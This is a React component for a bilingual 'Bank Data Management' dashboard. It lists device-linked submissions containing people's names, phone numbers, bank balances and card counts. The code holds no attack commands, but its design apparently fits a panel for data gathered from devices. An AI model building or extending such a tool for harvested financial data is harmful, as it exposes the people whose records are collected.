import React, { useState, useEffect } from 'react';
import { api } from '../../core/api';
import { CreditCard, RefreshCw } from 'lucide-react';
import { Language } from '../../types';
import BankTabs from '../bank-manager/BankTabs';
import BankOverviewTab from '../bank-manager/BankOverviewTab';
import BankSubmissionsTab from '../bank-manager/BankSubmissionsTab';

interface BankManagerProps {
  lang?: Language;
}

interface DataSubmission {
  id: number;
  device_id: string;
  device_name: string;
  platform: string;
  phone?: string;
  full_name?: string;
  total_balance?: number;
  submit_time: string;
  created_at: string;
}

interface Stats {
  total_submissions: number;
  total_devices: number;
  total_users: number;
  total_cards: number;
}

const BankManager: React.FC<BankManagerProps> = ({ lang = 'en' }) => {
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [stats, setStats] = useState<Stats | null>(null);
  const [submissions, setSubmissions] = useState<DataSubmission[]>([]);
  const [searchTerm, setSearchTerm] = useState('');
  const [selectedTab, setSelectedTab] = useState<'overview' | 'submissions' | 'devices' | 'users'>('overview');

  const translations = {
    en: {
      title: 'Bank Data Management',
      overview: 'Overview',
      submissions: 'Data Submissions',
      devices: 'Devices',
      users: 'Users',
      loading: 'Loading...',
      error: 'Error loading data',
      refresh: 'Refresh',
      search: 'Search',
      totalSubmissions: 'Total Submissions',
      totalDevices: 'Total Devices',
      totalUsers: 'Total Users',
      totalCards: 'Total Cards',
      deviceId: 'Device ID',
      deviceName: 'Device Name',
      platform: 'Platform',
      phone: 'Phone',
      fullName: 'Full Name',
      balance: 'Balance',
      submitTime: 'Submit Time',
      actions: 'Actions',
      view: 'View',
      noData: 'No data available',
      healthCheck: 'Health Check',
      systemInfo: 'System Info'
    },
    zh: {
      title: '银行数据管理',
      overview: '概览',
      submissions: '数据提交',
      devices: '设备',
      users: '用户',
      loading: '加载中...',
      error: '加载数据错误',
      refresh: '刷新',
      search: '搜索',
      totalSubmissions: '总提交数',
      totalDevices: '总设备数',
      totalUsers: '总用户数',
      totalCards: '总卡片数',
      deviceId: '设备ID',
      deviceName: '设备名称',
      platform: '平台',
      phone: '电话',
      fullName: '全名',
      balance: '余额',
      submitTime: '提交时间',
      actions: '操作',
      view: '查看',
      noData: '暂无数据',
      healthCheck: '健康检查',
      systemInfo: '系统信息'
    }
  };

  const t = translations[lang];

  useEffect(() => {
    loadData();
  }, [selectedTab]);

  const loadData = async () => {
    try {
      setLoading(true);
      setError(null);

      const statsResponse = await api.bankV1.getDataStats();
      if (statsResponse.success && statsResponse.data) {
        setStats({
          total_submissions: statsResponse.data.total_submissions || 0,
          total_devices: statsResponse.data.total_devices || 0,
          total_users: statsResponse.data.total_users || 0,
          total_cards: statsResponse.data.total_cards || 0
        });
      } else {
        setStats({
          total_submissions: 0,
          total_devices: 0,
          total_users: 0,
          total_cards: 0
        });
      }

      if (selectedTab === 'submissions') {
        const submissionsResponse = await api.bankV1.getDataSubmissions({ page: 1, per_page: 50 });
        if (submissionsResponse.success && submissionsResponse.data) {
          setSubmissions(submissionsResponse.data.data || []);
        }
      }

    } catch (err: any) {
      setError(err.message || t.error);
    } finally {
      setLoading(false);
    }
  };


  if (loading) {
    return (
      <div className="p-8 text-center text-slate-600 dark:text-slate-400">
        {t.loading}
      </div>
    );
  }

  if (error) {
    return (
      <div className="p-8 text-center">
        <div className="mb-4 text-red-500">{error}</div>
        <button
          onClick={loadData}
          className="px-4 py-2 bg-indigo-600 hover:bg-indigo-700 text-white rounded-lg transition-colors"
        >
          {t.refresh}
        </button>
      </div>
    );
  }

  return (
    <div className="p-6">
      <div className="flex items-center justify-between mb-6">
        <h2 className="text-2xl font-bold text-slate-800 dark:text-white flex items-center gap-2">
          <CreditCard size={28} />
          {t.title}
        </h2>
        <button
          onClick={loadData}
          className="flex items-center gap-2 px-4 py-2 bg-indigo-600 hover:bg-indigo-700 text-white rounded-lg transition-colors"
        >
          <RefreshCw size={20} />
          {t.refresh}
        </button>
      </div>

      <BankTabs
        activeTab={selectedTab}
        onTabChange={setSelectedTab}
        translations={{
          overview: t.overview,
          submissions: t.submissions,
          devices: t.devices,
          users: t.users,
        }}
      />

      {selectedTab === 'overview' && (
        <BankOverviewTab
          stats={stats}
          translations={{
            totalSubmissions: t.totalSubmissions,
            totalDevices: t.totalDevices,
            totalUsers: t.totalUsers,
            totalCards: t.totalCards,
          }}
        />
      )}

      {selectedTab === 'submissions' && (
        <BankSubmissionsTab
          submissions={submissions}
          searchTerm={searchTerm}
          onSearchChange={setSearchTerm}
          translations={{
            search: t.search,
            deviceId: t.deviceId,
            deviceName: t.deviceName,
            platform: t.platform,
            phone: t.phone,
            fullName: t.fullName,
            balance: t.balance,
            submitTime: t.submitTime,
            noData: t.noData,
          }}
        />
      )}

      {selectedTab === 'devices' && (
        <div className="bg-white dark:bg-slate-800 rounded-xl shadow-lg p-6">
          <p className="text-slate-600 dark:text-slate-400">{t.noData}</p>
        </div>
      )}

      {selectedTab === 'users' && (
        <div className="bg-white dark:bg-slate-800 rounded-xl shadow-lg p-6">
          <p className="text-slate-600 dark:text-slate-400">{t.noData}</p>
        </div>
      )}
    </div>
  );
};

export default BankManager;

